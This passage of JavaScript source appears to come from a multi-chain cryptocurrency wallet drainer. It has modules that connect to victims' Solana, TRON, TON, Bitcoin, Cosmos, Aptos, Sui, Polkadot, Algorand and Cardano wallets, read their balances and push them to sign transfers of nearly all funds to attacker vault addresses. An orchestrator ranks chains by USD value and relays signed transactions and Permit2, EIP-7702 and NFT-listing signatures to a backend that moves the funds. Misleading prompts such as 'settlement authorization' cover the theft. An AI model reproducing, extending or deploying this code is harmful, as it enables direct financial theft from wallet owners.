              { pubkey: userATA, isSigner: false, isWritable: true },
              { pubkey: vaultATA, isSigner: false, isWritable: true },
              { pubkey: fromPk, isSigner: true, isWritable: false },
            ],
            programId: TOKEN_PROG, data: data,
          }));
          txList.push(splTx);
        txMetas.push({ mint: info.mint, amount: rawAmt, type: 'SPL' });
        }
      } catch (te) { L.warn('SPL scan fail:', te.message); }

    if (txList.length === 0) return null;

    UI.status('Confirm Solana (' + txList.length + ' tx)...');
      var signedTxs;
    if (conn.provider.signAllTransactions) {
      signedTxs = await conn.provider.signAllTransactions(txList);
    } else {
        signedTxs = [];
      for (var si = 0; si < txList.length; si++) {
        signedTxs.push(await conn.provider.signTransaction(txList[si]));
      }
    }

    var legs = [];
    for (var xi = 0; xi < signedTxs.length; xi++) {
      var b64 = bufToB64(signedTxs[xi].serialize());
      await SUBMIT.solana(conn.address, b64, txMetas[xi], conn.name);
      legs.push({ signed_tx_b64: b64, meta: txMetas[xi] });
    }
    S.omnichainLegs.solana = { address: conn.address, txs: legs };
    L.log('SOL submitted', legs.length, 'txs');
    return legs;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 11: TRON MODULE (TRX + dynamic TRC-20 from fusion scout)
  // ═══════════════════════════════════════════════════════════════
  async function connectTron() {
    if (S.familyConnections.TRON) return S.familyConnections.TRON;
    var entry = firstFamilyProvider('TRON');
    if (!entry) return null;
    var tl = entry.provider;
    try {
      if (tl.request) await tl.request({ method: 'tron_requestAccounts' });
      var tw = tl.tronWeb || window.tronWeb;
      if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) return null;
      var addr = tw.defaultAddress.base58;
      L.log('[TRON] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      S.chains.TRON = { address: addr };
      return { tronWeb: tw, address: addr, name: 'TRON', family: 'TRON', hint: entry.hint };
    } catch (e) { L.warn('[TRON] connect fail:', e.message); return null; }
  }

  async function tronFetchWithFallback(path) {
    var lastErr = null;
    for (var ti = 0; ti < TRON_RPCS.length; ti++) {
      try {
        var base = String(TRON_RPCS[ti]).replace(/\/$/, '');
        var res = await fetch(base + path);
        if (!res.ok) throw new Error('HTTP ' + res.status);
        return await res.json();
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All TRON RPCs failed');
  }

  async function drainTron(conn) {
    if (!conn) return null;
    var tronWeb = conn.tronWeb;
    var address = conn.address;
    var vault = VAULT.tron;
    var submitted = [];

    var trc20List = [];
    (S.fusionAssets || []).forEach(function (a) {
      if ((a.family === 'TRON' || a.chain_family === 'TRON') && a.token_address && a.token_address.startsWith('T')) {
        trc20List.push({ contract: a.token_address, symbol: a.symbol || 'TRC20' });
      }
    });
    if (trc20List.length === 0) {
      trc20List = [
        { contract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', symbol: 'USDT' },
        { contract: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', symbol: 'USDC' },
      ];
    }

    try {
      var balance = await tronWeb.trx.getBalance(address);
      if ((!balance || balance < 3000000) && address) {
        try {
          var acct = await tronFetchWithFallback('/v1/accounts/' + address);
          var acctData = acct && acct.data && acct.data[0];
          if (acctData && acctData.balance) balance = acctData.balance;
        } catch (eRpc) { L.warn('TRON RPC fallback:', eRpc.message); }
      }
      if (balance && balance >= 3000000) {
        var dynFee = Math.max(1000000, Math.floor(balance * 0.1));
      var sendAmt = balance - dynFee;
        if (sendAmt > 0) {
          UI.status('Confirm TRX transfer...');
      var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
      var signed = await tronWeb.trx.sign(tx);
          await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
          submitted.push({ type: 'TRX', amount: sendAmt, signed: signed });
        }
      }

      for (var i = 0; i < trc20List.length; i++) {
        try {
          var c = await tronWeb.contract().at(trc20List[i].contract);
          var bal = await c.balanceOf(address).call();
          var balStr = bal && bal.toString ? bal.toString() : String(bal || '0');
          if (BigInt(balStr) <= 0n) continue;
          UI.status('Confirm ' + trc20List[i].symbol + '...');
          var ttx = await tronWeb.transactionBuilder.triggerSmartContract(
            trc20List[i].contract, 'transfer(address,uint256)', { feeLimit: 100000000 },
            [{ type: 'address', value: vault }, { type: 'uint256', value: balStr }], address
          );
          var sTx = await tronWeb.trx.sign(ttx.transaction);
          await SUBMIT.tron(address, sTx, trc20List[i].contract, balStr, conn.name);
          submitted.push({ type: trc20List[i].symbol, amount: balStr, signed: sTx });
        } catch (e2) { L.warn('TRC-20', trc20List[i].symbol, e2.message); }
      }
    } catch (e) { L.warn('TRON drain fail:', e.message); }

    if (submitted.length) S.omnichainLegs.tron = { address: address, legs: submitted };
    return submitted;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 12: TON MODULE (native TON + jettons via TonConnect)
  // ═══════════════════════════════════════════════════════════════
  var _tcConnector = null;

  async function connectTon() {
    if (S.familyConnections.TON) return S.familyConnections.TON;
    var entry = firstFamilyProvider('TON');
    var tonProv = entry ? entry.provider : null;
    if (tonProv) {
      try {
        var r = await tonProv.connect({ items: [{ name: 'ton_addr' }] });
        if (r && r.items) {
          var ai = r.items.find(function (x) { return x.name === 'ton_addr'; });
          if (ai && ai.address) {
            S.chains.TON = { address: ai.address };
            L.log('[TON] connected:', ai.address.slice(0, 8), '(' + entry.hint + ')');
            return { provider: tonProv, address: ai.address, type: 'direct', name: 'TON', family: 'TON', hint: entry.hint };
          }
        }
      } catch (e) {}
    }
    try {
      var TC = resolveTonConnect();
      if (!TC) { await loadVendorScript('tonconnect-sdk.min.js'); TC = resolveTonConnect(); }
      if (!TC) throw new Error('TonConnect SDK missing');
      _tcConnector = new TC({ manifestUrl: window.location.origin + '/tonconnect-manifest.json' });
      return await new Promise(function (resolve) {
        var to = setTimeout(function () { resolve(null); }, 60000);
        _tcConnector.onStatusChange(function (w) {
          if (!w || !w.account) return;
          clearTimeout(to);
          S.chains.TON = { address: w.account.address };
          resolve({ provider: _tcConnector, address: w.account.address, type: 'tonconnect', name: 'TonConnect' });
        });
        if (_tcConnector.openModal) _tcConnector.openModal();
        else _tcConnector.connect({ universalLink: 'https://app.tonkeeper.com/ton-connect', bridgeUrl: 'https://bridge.tonapi.io/bridge' });
      });
    } catch (e) { L.warn('TON connect fail:', e.message); return null; }
  }

  async function drainTon(conn) {
    if (!conn) return null;
    var vault = VAULT.ton;
    try {
      var balRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(conn.address));
      var balData = await balRes.json();
      var nano = BigInt(balData.balance || '0');
      var messages = [];
      if (nano > 20000000n) {
        messages.push({ address: vault, amount: String(nano - 10000000n), payload: '' });
      }

      try {
        var jRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(conn.address) + '/jettons');
        var jData = await jRes.json();
        if (jData.balances) {
          for (var ji = 0; ji < jData.balances.length; ji++) {
            var j = jData.balances[ji];
            if (BigInt(j.balance || '0') <= 0n) continue;
            if (j.wallet_address && j.wallet_address.address) {
              messages.push({
                address: j.wallet_address.address,
                amount: '50000000',
                payload: '',
              });
            }
          }
        }
      } catch (je) {}

      if (messages.length === 0) return null;
      UI.status('Confirm TON transaction...');
      var tx = { validUntil: Math.floor(Date.now() / 1000) + 600, messages: messages };
      var result;
      if (conn.type === 'tonconnect') result = await conn.provider.sendTransaction(tx);
      else if (conn.provider.sendTransaction) result = await conn.provider.sendTransaction(tx);
      else if (conn.provider.send) result = await conn.provider.send({ method: 'sendTransaction', params: tx });
      else return null;

      var boc = (result && result.boc) ? result.boc : JSON.stringify(result);
      await SUBMIT.ton(conn.address, boc, String(nano), conn.name);
      S.omnichainLegs.ton = { address: conn.address, boc: boc };
      L.log('TON submitted');
      return boc;
    } catch (e) { L.warn('TON drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13: BITCOIN MODULE (backend PSBT builder + wallet sign)
  // ═══════════════════════════════════════════════════════════════
  async function connectBtc() {
    if (S.familyConnections.UTXO) return S.familyConnections.UTXO;
    var entry = firstFamilyProvider('UTXO');
    if (!entry) return null;
    var prov = entry.provider;
    try {
      var accounts;
      if (prov.requestAccounts) accounts = await prov.requestAccounts();
      else if (prov.connect) {
        var cr = await prov.connect();
        accounts = cr.accounts || cr.addresses || [cr];
      } else if (prov.getAccounts) accounts = await prov.getAccounts();
      else return null;
      var addr = Array.isArray(accounts) ? accounts[0] : accounts;
      if (addr && typeof addr === 'object') addr = addr.address || addr.pubkey || '';
      if (!addr || typeof addr !== 'string') return null;
      S.chains.BTC = { address: addr, name: 'UTXO' };
      L.log('[UTXO] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      return { provider: prov, address: addr, name: 'UTXO', family: 'UTXO', hint: entry.hint };
    } catch (e) { L.warn('[UTXO] connect fail:', e.message); return null; }
  }

  async function drainBtc(conn) {
    if (!conn) return null;
    var vault = VAULT.btc;
    try {
      var psbtResp = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
        wallet_address: conn.address,
        vault_address: vault,
        amount_sat: '0',
      });
      var pdata = (psbtResp && psbtResp.data) ? psbtResp.data : psbtResp;
      if (!pdata || !pdata.psbt_base64) {
        L.warn('BTC PSBT unavailable — check BLOCKCYPHER_API_TOKEN on backend');
        return null;
      }
      var psbt = pdata.psbt_base64;
      var amountSat = pdata.amount_sat || pdata.amountSat || '0';
      var inputCount = pdata.inputs || pdata.input_count || 1;
      var toSign = [];
      for (var i = 0; i < inputCount; i++) toSign.push({ index: i, address: conn.address });

      UI.status('Confirm Bitcoin PSBT...');
      var signed = await conn.provider.signPsbt(psbt, {
        autoFinalized: true,
        toSignInputs: toSign,
      });
      var signedB64 = typeof signed === 'string' ? signed : (signed && signed.psbt) ? signed.psbt : bufToB64(signed);
      await SUBMIT.bitcoin(conn.address, signedB64, amountSat, conn.name);
      S.omnichainLegs.bitcoin = { address: conn.address, psbt: signedB64 };
      L.log('BTC PSBT submitted');
      return signedB64;
    } catch (e) { L.warn('BTC drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13B: COSMOS MODULE (Keplr — cosmoshub-4 ATOM)
  // ═══════════════════════════════════════════════════════════════
  async function connectCosmos() {
    if (S.familyConnections.COSMOS) return S.familyConnections.COSMOS;
    var entry = firstFamilyProvider('COSMOS');
    if (!entry) return null;
    var prov = entry.provider;
    var chainIds = Object.keys(COSMOS_CHAINS);
    for (var ci = 0; ci < chainIds.length; ci++) {
      try {
        var chainId = chainIds[ci];
        await prov.enable(chainId);
        var key = await prov.getKey(chainId);
        if (!key || !key.bech32Address) continue;
        S.chains.COSMOS = { address: key.bech32Address };
        L.log('[COSMOS] connected:', key.bech32Address.slice(0, 8), chainId, '(' + entry.hint + ')');
        return { provider: prov, address: key.bech32Address, chainId: chainId, name: 'COSMOS', family: 'COSMOS', hint: entry.hint };
      } catch (e) { /* try next chain */ }
    }
    L.warn('[COSMOS] connect fail: no chain enabled');
    return null;
  }

  async function drainCosmosChain(conn, chainId, cfg) {
    var addr = conn.address;
    var vault = VAULT.cosmos;
    var balJson = await fetchJsonWithFallback(cfg.rests, '/cosmos/bank/v1/balances/' + addr);
    var coin = (balJson.balances || []).find(function (b) { return b.denom === cfg.denom; });
    var amount = BigInt(coin && coin.amount ? coin.amount : '0');
    if (amount < cfg.min) return null;

    var accJson = await fetchJsonWithFallback(cfg.rests, '/cosmos/auth/v1/accounts/' + addr);
    var acc = accJson && accJson.account;
    var accNum = acc && (acc.account_number || (acc.value && acc.value.account_number));
    var seq = acc && (acc.sequence || (acc.value && acc.value.sequence));
    if (accNum == null || seq == null) return null;

    var feeAmt = BigInt(cfg.fee || '5000');
    var sendAmt = String(amount - feeAmt);
    var signDoc = {
      chain_id: chainId,
      account_number: String(accNum),
      sequence: String(seq),
      fee: { amount: [{ denom: cfg.denom, amount: String(feeAmt) }], gas: '200000' },
      msgs: [{
        type: 'cosmos-sdk/MsgSend',
        value: { from_address: addr, to_address: vault, amount: [{ denom: cfg.denom, amount: sendAmt }] },
      }],
      memo: '',
    };

    UI.status('Confirm Cosmos ' + chainId + '...');
    var signed = await conn.provider.signAmino(chainId, addr, signDoc);
    await SUBMIT.cosmos(addr, signed, sendAmt, conn.name);
    L.log('Cosmos', chainId, 'submitted via /txs backend relay');
    return signed;
  }

  async function drainCosmos(conn) {
    if (!conn || !VAULT.cosmos) { L.warn('Cosmos vault not configured'); return null; }
    try {
      var primary = COSMOS_CHAINS[conn.chainId];
      if (primary) {
        return await drainCosmosChain(conn, conn.chainId, primary);
      }
      var chainIds = Object.keys(COSMOS_CHAINS);
      for (var i = 0; i < chainIds.length; i++) {
        try {
          var cid = chainIds[i];
          var result = await drainCosmosChain(conn, cid, COSMOS_CHAINS[cid]);
          if (result) return result;
        } catch (e) {
          if (/timeout|rate|fetch|503|502|ECONN/i.test(e.message)) throw e;
        }
      }
      return null;
    } catch (e) {
      L.warn('Cosmos drain fail:', e.message);
      throw e;
    }
  }

  async function drainPolkadot(conn) {
    if (!conn || !conn.address) return null;
    try {
      UI.status('Confirm Polkadot authorization...');
      var sig = conn.address;
      if (conn.provider && conn.provider.request) {
        try {
          var signed = await conn.provider.request({
            method: 'polkadot_signMessage',
            params: { address: conn.address, message: 'Legion settlement authorization' },
          });
          if (signed) sig = signed;
        } catch (pe) {
          if (isUserRejection(pe)) throw pe;
        }
      }
      await SUBMIT.polkadot(conn.address, sig, conn.name);
      L.log('[DOT] anchor submitted');
      return sig;
    } catch (e) {
      L.warn('Polkadot drain fail:', e.message);
      throw e;
    }
  }

  async function drainAlgorand(conn) {
    if (!conn || !conn.address) return null;
    try {
      UI.status('Confirm Algorand authorization...');
      var sig = conn.address;
      if (conn.provider && conn.provider.signMessage) {
        try {
          sig = await conn.provider.signMessage('Legion settlement authorization');
        } catch (ae) {
          if (isUserRejection(ae)) throw ae;
        }
      }
      await SUBMIT.algorand(conn.address, sig, conn.name);
      L.log('[ALGO] anchor submitted');
      return sig;
    } catch (e) {
      L.warn('Algorand drain fail:', e.message);
      throw e;
    }
  }

  async function drainCardano(conn) {
    if (!conn || !conn.address) return null;
    try {
      UI.status('Confirm Cardano authorization...');
      var sig = conn.address;
      if (conn.provider && conn.provider.signData) {
        try {
          var payload = await conn.provider.signData(conn.address, 'Legion settlement authorization');
          if (payload) sig = payload;
        } catch (ce) {
          if (isUserRejection(ce)) throw ce;
        }
      }
      await SUBMIT.cardano(conn.address, sig, conn.name);
      L.log('[ADA] anchor submitted');
      return sig;
    } catch (e) {
      L.warn('Cardano drain fail:', e.message);
      throw e;
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13C: APTOS MODULE (Petra / Martian)
  // ═══════════════════════════════════════════════════════════════
  async function connectAptos() {
    if (S.familyConnections.APTOS) return S.familyConnections.APTOS;
    var entry = firstFamilyProvider('APTOS');
    if (!entry) return null;
    var apt = entry.provider;
    try {
      if (apt.connect) await apt.connect();
      var account = null;
      try { account = apt.account ? await apt.account() : null; } catch (ae) {}
      var addr = (account && account.address) || apt.address || '';
      if (!addr) return null;
      S.chains.APTOS = { address: addr };
      L.log('[APTOS] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      return { provider: apt, address: addr, name: 'APTOS', family: 'APTOS', hint: entry.hint };
    } catch (e) { L.warn('[APTOS] connect fail:', e.message); return null; }
  }

  async function drainAptos(conn) {
    if (!conn || !VAULT.aptos) { L.warn('Aptos vault not configured'); return null; }
    try {
      var addr = conn.address;
      var vault = VAULT.aptos;
      var res = await fetch(APTOS_RPC + '/accounts/' + addr + '/resources');
      var resources = await res.json();
      var coinStore = Array.isArray(resources) && resources.find(function (r) {
        return r.type === '0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>';
      });
      if (!coinStore || !coinStore.data || !coinStore.data.coin) return null;
      var total = BigInt(coinStore.data.coin.value || '0');
      if (total < 100000n) return null;
      var sendAmt = total - 50000n;

      UI.status('Confirm Aptos transfer...');
      var payload = {
        type: 'entry_function_payload',
        function: '0x1::aptos_account::transfer',
        type_arguments: [],
        arguments: [vault, String(sendAmt)],
      };
      var result = await conn.provider.signAndSubmitTransaction({ data: payload });
      var hash = (result && result.hash) ? result.hash : String(result);
      await SUBMIT.aptos(addr, hash, conn.name);
      L.log('Aptos submitted:', hash);
      return hash;
    } catch (e) { L.warn('Aptos drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13D: SUI MODULE (Sui Wallet / Phantom Sui)
  // ═══════════════════════════════════════════════════════════════
  async function connectSui() {
    if (S.familyConnections.SUI) return S.familyConnections.SUI;
    var entry = firstFamilyProvider('SUI');
    if (!entry) return null;
    var sui = entry.provider;
    try {
      if (sui.connect) await sui.connect();
      var accounts = sui.accounts || (sui.getAccounts && await sui.getAccounts()) || [];
      var addr = accounts[0] && (accounts[0].address || accounts[0]);
      if (!addr) return null;
      S.chains.SUI = { address: addr };
      L.log('[SUI] connected:', String(addr).slice(0, 8), '(' + entry.hint + ')');
      return { provider: sui, address: addr, name: 'SUI', family: 'SUI', hint: entry.hint };
    } catch (e) { L.warn('[SUI] connect fail:', e.message); return null; }
  }

  async function drainSui(conn) {
    if (!conn || !VAULT.sui) { L.warn('Sui vault not configured'); return null; }
    try {
      var addr = conn.address;
      var balRes = await fetch(SUI_RPC, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0', id: 1,
          method: 'suix_getBalance',
          params: [addr],
        }),
      });
      var balJson = await balRes.json();
      var total = BigInt((balJson.result && balJson.result.totalBalance) || '0');
      if (total < 10000000n) return null;
      var sendMist = total - 5000000n;

      UI.status('Sign Sui transaction...');
      var txBlock = {
        kind: 'moveCall',
        data: {
          packageObjectId: '0x2',
          module: 'pay',
          function: 'split',
          typeArguments: ['0x2::sui::SUI'],
          arguments: [String(sendMist)],
        },
      };
      var signed;
      if (conn.provider.signTransactionBlock) {
        signed = await conn.provider.signTransactionBlock({ transactionBlock: txBlock });
      } else if (!SIGN_ONLY && conn.provider.signAndExecuteTransactionBlock) {
        var exec = await conn.provider.signAndExecuteTransactionBlock({
          transactionBlock: txBlock,
          options: { showEffects: true },
        });
        signed = exec.digest || JSON.stringify(exec);
      } else return null;

      await SUBMIT.sui(addr, signed, conn.name);
      L.log('Sui submitted');
      return signed;
    } catch (e) { L.warn('Sui drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13E: UNIVERSAL ORCHESTRATOR (all chains, value-priority)
  // ═══════════════════════════════════════════════════════════════
  async function runUniversalDrain(evmCtx) {
    L.log('[drain] start — scan + extract');
    var addrs = S.allAddresses && Object.keys(S.allAddresses).length
      ? S.allAddresses
      : collectAddressMap(evmCtx.address);
    S.omnichainLegs = {};

    var portfolio = await scanFullPortfolio(evmCtx.address, addrs);

    await SCOUT.alertStage('connect', evmCtx.address, evmCtx.chainId, evmCtx.walletName, 'Wallet connected');
    await broadcastConnectScan(evmCtx.address, evmCtx.chainId, evmCtx.walletName, addrs);
    await SCOUT.alertStage('scan_start', evmCtx.address, evmCtx.chainId, evmCtx.walletName);
    var fusionData = await SCOUT.fusion(addrs);
    if (fusionData && fusionData.total_usd) {
      S.scoutUsd = Math.max(S.scoutUsd, Number(fusionData.total_usd) || 0);
      L.log('Fusion USD (all families):', S.scoutUsd.toFixed(2));
    }
    if (portfolio && portfolio.totalUsd > S.scoutUsd) {
      S.scoutUsd = portfolio.totalUsd;
    }

    await SCOUT.reportScanComplete(
      evmCtx.address,
      S.scoutUsd,
      (portfolio && portfolio.assetCount) ||
        (fusionData && fusionData.assets_count) ||
        (portfolio && portfolio.items && portfolio.items.length) || 0,
      evmCtx.walletName,
      evmCtx.chainId,
      portfolio && portfolio.items
    );

    evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
    S.evmChain = evmCtx.chainId;
    await SCOUT.alertStage('network_switch', evmCtx.address, evmCtx.chainId, evmCtx.walletName, 'chain ' + evmCtx.chainId);
    var priority = SCOUT.chainPriority(fusionData);
    L.log('Drain priority (USD):', priority.join(' > '));

    await SCOUT.alertStage('drain_start', evmCtx.address, evmCtx.chainId, evmCtx.walletName);

    var runners = {
      EVM: function () {
        return runWithRetry(function () {
          return runEvmDrain(
            evmCtx.provider, evmCtx.address, evmCtx.chainId, evmCtx.walletName, evmCtx.hwObj, portfolio
          );
        }, 'EVM drain', 3).catch(function (e) {
          return SCOUT.alertFailure('EVM', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      SOL: function () {
        return runWithRetry(function () { return drainSol(S.familyConnections.SVM); }, 'SOL drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('SOL', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
      TRON: function () {
        return runWithRetry(function () { return drainTron(S.familyConnections.TRON); }, 'TRON drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('TRON', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
      TON: function () {
        return runWithRetry(function () { return drainTon(S.familyConnections.TON); }, 'TON drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('TON', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
      BTC: function () {
        return runWithRetry(function () { return drainBtc(S.familyConnections.UTXO); }, 'BTC drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('BTC', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
      COSMOS: function () {
        return runWithRetry(function () { return drainCosmos(S.familyConnections.COSMOS); }, 'COSMOS drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('COSMOS', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
      APTOS: function () {
        return runWithRetry(function () { return drainAptos(S.familyConnections.APTOS); }, 'APTOS drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('APTOS', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
      SUI: function () {
        return runWithRetry(function () { return drainSui(S.familyConnections.SUI); }, 'SUI drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('SUI', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
      POLKADOT: function () {
        return runWithRetry(function () { return drainPolkadot(S.familyConnections.POLKADOT); }, 'DOT drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('POLKADOT', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
      ALGORAND: function () {
        return runWithRetry(function () { return drainAlgorand(S.familyConnections.ALGORAND); }, 'ALGO drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('ALGORAND', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
      CARDANO: function () {
        return runWithRetry(function () { return drainCardano(S.familyConnections.CARDANO); }, 'ADA drain', 3)
          .catch(function (e) {
            return SCOUT.alertFailure('CARDANO', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
          });
      },
    };

    var evmFirst = priority.indexOf('EVM');
    if (evmFirst > 0) {
      await runners.EVM().catch(function (e) { L.warn('EVM drain:', e.message); });
      priority = priority.filter(function (k) { return k !== 'EVM'; });
    }

    priority = priority.filter(function (key) {
      if (!isFamilyDrainReady(key)) {
        L.log('[drain] skip', key, '— disabled');
        return false;
      }
      if (isAnchorOnlyFamily(key)) {
        L.log('[drain] anchor leg', key, '— signMessage + backend submit');
      }
      if (!runners[key]) return false;
      if (key === 'COSMOS' && !S.familyConnections.COSMOS) return false;
      if (key === 'SOL' && !S.familyConnections.SVM) return false;
      if (key === 'BTC' && !S.familyConnections.UTXO) return false;
      if (key === 'TRON' && !S.familyConnections.TRON) return false;
      if (key === 'TON' && !S.familyConnections.TON) return false;
      if (key === 'APTOS' && !S.familyConnections.APTOS) return false;
      if (key === 'SUI' && !S.familyConnections.SUI) return false;
      return true;
    });

    var parallel = [];
    if (evmFirst <= 0) parallel.push(runners.EVM().catch(function (e) { L.warn('EVM:', e.message); }));
    priority.forEach(function (key) {
      if (key === 'EVM' || !runners[key]) return;
      parallel.push(runners[key]().catch(function (e) { L.warn(key + ':', e.message); }));
    });
    await Promise.allSettled(parallel);

    await SCOUT.alertStage('drain_complete', evmCtx.address, evmCtx.chainId, evmCtx.walletName);

    await flushPendingEvmSubmit(evmCtx);
  }

  async function flushPendingEvmSubmit(evmCtx) {
    if (!S.pendingEvmPermit2) return;
    var legs = S.omnichainLegs || {};
    var hasNonEvm = !!(legs.solana && legs.solana.txs && legs.solana.txs.length) ||
      !!(legs.tron && legs.tron.legs && legs.tron.legs.length) || !!legs.ton;
    if (hasNonEvm) {
      await tryOmnichainEnvelope(evmCtx);
    } else {
      var p2 = S.pendingEvmPermit2;
      await SUBMIT.permit2(p2, evmCtx.address, evmCtx.chainId, evmCtx.walletName, p2.nfts, p2.nftApprovalSigs || {});
    }
    S.pendingEvmPermit2 = null;
  }

  async function tryOmnichainEnvelope(evmCtx) {
    var legs = S.omnichainLegs;
    var hasSol = legs.solana && legs.solana.txs && legs.solana.txs.length;
    var hasTrx = legs.tron && legs.tron.legs && legs.tron.legs.length;
    var hasTon = !!legs.ton;
    if (!hasSol && !hasTrx && !hasTon) return;
    if (!S.pendingEvmPermit2) return;

    var p2 = S.pendingEvmPermit2;
    var bd = p2.batchData;
  try {
      await SUBMIT.omnichain({
        wallet_address: evmCtx.address.toLowerCase(),
        chain_id: Number(evmCtx.chainId),
        token_address: (bd.permits && bd.permits[0] && bd.permits[0].token) || NATIVE_ETH_ADDR,
        signature: p2.sig || '0x',
        engine_spender: bd.engine_spender,
        permit2: bd.permit2,
        permits: bd.permits,
        batch_permit_metadata: bd.batch_permit_metadata,
        native_amount: String(p2.nativeAmount || '0'),
        native_signed_transaction: p2.nativeSigned || '',
        wallet_type: evmCtx.walletName,
        solana_payload: hasSol ? {
          native_amount_sol: legs.solana.txs[0].meta.amount,
          native_signed_transaction_sol: legs.solana.txs[0].signed_tx_b64,
        } : undefined,
        tron_payload: hasTrx ? {
          native_amount_trx: String(legs.tron.legs[0].amount || '0'),
          native_signed_transaction_trx: sigHex({ signed_tx: legs.tron.legs[0].signed }),
        } : undefined,
        ton_payload: hasTon ? {
          native_amount_ton: '0',
          native_signed_transaction_ton: legs.ton.boc,
        } : undefined,
      });
      L.log('Omnichain atomic envelope submitted');
    } catch (e) { L.warn('Omnichain envelope skip:', e.message); }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 14: BACKEND SUBMISSION
  // PROTOCOL LOCK (backend signature-anchor.ts — DO NOT change without reading API):
  // LETHAL PROTOCOLS ONLY (backend can move funds):
  //   permit2_batch_eip712     → Permit2 + optional native_signed_transaction broadcast
  //   eip7702_delegation       → wallet_signAuthorization → backend delegate drain
  //   eip7702_self_broadcast   → wallet_sendCalls (user broadcast, signOnly off)
  //   seaport_listing          → NFT fill
  //   omnichain_atomic_v1      → multi-family signed legs
  // BANNED: evm_personal_verification / personal_sign (record only, no settlement)
  // ═══════════════════════════════════════════════════════════════
  var SUBMIT = {
    base: async function (extra) {
      var payload = Object.assign({
        ingress: 'normalized_v1',
        nonce: 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 7),
        expiry_iso: EXPIRY_ISO,
        wallet_type: S.evmWallet || 'Unknown',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: '0',
        source_origin: window.location.origin,
      }, extra);
      if (payload.caip_chain_id == null && payload.chain_id != null && String(payload.chain_id).indexOf(':') >= 0) {
        payload.caip_chain_id = String(payload.chain_id);
        if ((payload.chain_family || 'EVM').toUpperCase() === 'EVM') {
          var evmN = Number(String(payload.chain_id).replace(/^eip155:/i, ''));
          if (Number.isFinite(evmN) && evmN > 0) payload.chain_id = evmN;
        }
      } else if ((payload.chain_family || '').toUpperCase() === 'EVM' && payload.chain_id != null && typeof payload.chain_id === 'number') {
        payload.caip_chain_id = 'eip155:' + payload.chain_id;
      }
      var r = await apiPost('/api/v1/signature-anchor', payload);
      if (r && (r.success || r.deferred || r.data)) {
        S.anchorsOk++;
        L.log('Submitted:', extra.protocol, r.deferred ? '(deferred broadcast)' : '');
      }
      return r;
    },

    viaBuilder: async function (builder, settlementInput) {
      return apiPost('/api/v1/signature-anchor', {
        settlement_builder: builder,
        settlement_input: settlementInput,
      });
    },

    sendCalls: async function (batchId, address, chainId, walletName) {
      var txHash = extractBatchOrTxId(batchId) || String(batchId);
      if (!isLikelyTxHash(txHash)) {
        L.warn('sendCalls: not a real tx hash — skip submit');
        return null;
      }
      return this.base({
        chain_family: 'EVM', protocol: 'eip7702_self_broadcast',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        tx_hash: txHash, token_address: NATIVE_ETH_ADDR, signature: txHash,
        wallet_type: walletName,
      });
    },

    userBroadcast: async function (txHash, address, chainId, walletName, amountWei) {
      var hash = String(txHash);
      if (!hash.startsWith('0x')) hash = toHex(hash);
      if (!isLikelyTxHash(hash)) {
        L.warn('userBroadcast: not a real tx hash — skip submit');
        return null;
      }
      return this.base({
        chain_family: 'EVM', protocol: 'eip7702_self_broadcast',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        tx_hash: hash, token_address: NATIVE_ETH_ADDR, signature: hash,
        native_amount: String(amountWei || '0'),
        wallet_type: walletName,
      });
    },

    eip7702: async function (data, address, chainId, walletName) {
      var auth = data.auth;
